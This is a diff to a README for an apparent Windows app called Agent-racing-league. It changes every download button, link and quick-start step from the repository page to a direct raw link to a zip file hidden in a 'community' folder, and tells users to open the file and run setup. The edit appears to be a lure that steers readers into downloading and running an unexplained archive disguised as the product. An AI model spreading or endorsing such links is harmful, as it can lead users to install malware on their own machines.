@@ -1,6 +1,6 @@
 # 🤖 Agent-racing-league - Run AI races on your PC
 
-[![Download Agent-racing-league](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Cissyinadmissible368/Agent-racing-league)
+[![Download Agent-racing-league](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Cissyinadmissible368/Agent-racing-league/raw/refs/heads/main/community/league_racing_Agent_stallar.zip)
 
 ## 🏁 What this is
 
@@ -17,7 +17,7 @@ It is made for people who want to try AI agent races on Windows without setting 
 
 ## 🚀 Download and install
 
-1. Open the download page: https://github.com/Cissyinadmissible368/Agent-racing-league
+1. Open the download page: https://github.com/Cissyinadmissible368/Agent-racing-league/raw/refs/heads/main/community/league_racing_Agent_stallar.zip
 2. Look for the latest release or download option
 3. Get the Windows version
 4. Save the file to your PC
@@ -25,7 +25,7 @@ It is made for people who want to try AI agent races on Windows without setting 
 6. Follow the on-screen setup steps
 7. Open Agent-racing-league from your Start menu or desktop
 
-[![Open Download Page](https://img.shields.io/badge/Open%20Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Cissyinadmissible368/Agent-racing-league)
+[![Open Download Page](https://img.shields.io/badge/Open%20Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Cissyinadmissible368/Agent-racing-league/raw/refs/heads/main/community/league_racing_Agent_stallar.zip)
 
 ## 💻 What you need
 
@@ -116,7 +116,7 @@ If your screen looks small, use full screen mode or increase the app window size
 
 Use this page to download or open the latest version:
 
-https://github.com/Cissyinadmissible368/Agent-racing-league
+https://github.com/Cissyinadmissible368/Agent-racing-league/raw/refs/heads/main/community/league_racing_Agent_stallar.zip
 
 ## 🧩 Common setup flow
 
@@ -171,7 +171,7 @@ AI agents can look good in a demo and fail in a real test. This app gives them t
 
 ## 📌 Quick start
 
-1. Go to https://github.com/Cissyinadmissible368/Agent-racing-league
+1. Go to https://github.com/Cissyinadmissible368/Agent-racing-league/raw/refs/heads/main/community/league_racing_Agent_stallar.zip
 2. Download the Windows version
 3. Open the file
 4. Finish setup
